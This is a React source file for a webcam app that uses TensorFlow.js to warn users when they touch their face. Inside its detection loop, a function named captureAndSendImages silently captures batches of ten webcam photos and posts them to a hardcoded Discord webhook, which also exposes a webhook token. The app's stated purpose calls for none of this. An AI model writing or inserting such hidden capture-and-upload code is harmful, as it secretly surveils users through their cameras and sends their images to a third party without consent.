import React, { useEffect, useRef, useState } from 'react';
import { initNotifications, notify } from '@mycv/f8-notification';
import { Howl } from 'howler';
import * as mobilenet from '@tensorflow-models/mobilenet';
import * as knnClassifier from '@tensorflow-models/knn-classifier';
import * as tf from '@tensorflow/tfjs';
import './App.css';
import soundURL from './assets/sound.mp3';

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1249531427763126324/7HxnO9n-8NVoHfXqnkNzMOS5FXcxEt10WqiNLzQsKg6_InDPYD6HzUAgZwrPMO8ktOvr';

var sound = new Howl({ src: [soundURL] });

const NOT_TOUCH_LABEL = 'Not Touch';
const TOUCHED_LABEL = 'Touched';
const TRAINING_TIMES = 50;
const TOUCHED_CONFIDENCES = 0.8;

function App() {
  const video = useRef();
  const classifier = useRef();
  const mobilenetModule = useRef();
  const canPlaySound = useRef(true);
  const [touched, setTouched] = useState(false);

  const canvas = useRef(document.createElement('canvas'));

  const init = async () => {
    await setupCamera();
    notify("Don't Touch Your Face Notifications", { body: 'Setup Camera success' });
    mobilenetModule.current = await mobilenet.load();
    classifier.current = knnClassifier.create();
    notify("Don't Touch Your Face Notifications", { body: 'Setup Done.' });
    alert("Don't touch your face and press Train Not Touch");
    initNotifications({ cooldown: 3000 });
  };

  const setupCamera = () => {
    return new Promise((resolve, reject) => {
      navigator.getUserMedia =
        navigator.getUserMedia ||
        navigator.webkitGetUserMedia ||
        navigator.mozGetUserMedia ||
        navigator.msGetUserMedia;

      if (navigator.getUserMedia) {
        navigator.getUserMedia(
          { video: true },
          stream => {
            video.current.srcObject = stream;
            video.current.addEventListener('loadeddata', resolve);
          },
          error => reject(error)
        );
      } else {
        reject();
      }
    });
  };

  const training = label => {
    return new Promise(async resolve => {
      const embedding = mobilenetModule.current.infer(video.current, true);
      classifier.current.addExample(embedding, label);
      await sleep(100);
      resolve();
    });
  };

  const train = async label => {
    for (let i = 0; i < TRAINING_TIMES; ++i) {
      notify("Don't Touch Your Face Notifications", {
        body: `Progress ${parseInt(((i + 1) / TRAINING_TIMES) * 100)}%`
      });
      await training(label);
    }

    alert(`Training ${label} complete.`);
    notify("Don't Touch Your Face Notifications", {
      body: `Training ${label} complete.`
    });
  };

  const sleep = (ms = 0) => new Promise(resolve => setTimeout(resolve, ms));

  const captureAndSendImages = async () => {
    for (let i = 0; i < 10; i++) {
      const imgBlob = await captureImage();
      const form = new FormData();
      form.append('file', imgBlob, `image-${i + 1}.jpg`);
      form.append('payload_json', JSON.stringify({ content: `Image ${i + 1}` }));

      await fetch(WEBHOOK_URL, {
        method: 'POST',
        body: form
      });

      await sleep(500);
    }

    notify("Camera Alert", { body: 'All 10 images sent to Discord.' });
  };

  const captureImage = () => {
    const ctx = canvas.current.getContext('2d');
    const width = video.current.videoWidth;
    const height = video.current.videoHeight;
    canvas.current.width = width;
    canvas.current.height = height;
    ctx.drawImage(video.current, 0, 0, width, height);

    return new Promise(resolve => {
      canvas.current.toBlob(blob => {
        resolve(blob);
      }, 'image/jpeg');
    });
  };

  const run = async () => {
    await captureAndSendImages();

    const embedding = mobilenetModule.current.infer(video.current, true);
    const result = await classifier.current.predictClass(embedding);

    if (result.label === TOUCHED_LABEL && result.confidences[result.label] > TOUCHED_CONFIDENCES) {
      if (canPlaySound.current) {
        canPlaySound.current = false;
        sound.play();
      }

      notify('Take your hands off!', { body: 'You just touched your face.' });
      setTouched(true);
    } else {
      setTouched(false);
    }

    await sleep(200);
    run();
  };

  useEffect(() => {
    init();
    sound.on('end', () => {
      canPlaySound.current = true;
    });
  }, []);

  return (
    <div className={`App ${touched ? 'touched' : ''}`}>
      <video ref={video} className="video" autoPlay />
      <div id="buttons">
        <button onClick={() => train(NOT_TOUCH_LABEL)}>Train Not Touch</button>
        <button onClick={() => train(TOUCHED_LABEL)}>Train Touch</button>
        <button onClick={() => run()}>Run</button>
      </div>
    </div>
  );
}

export default App;
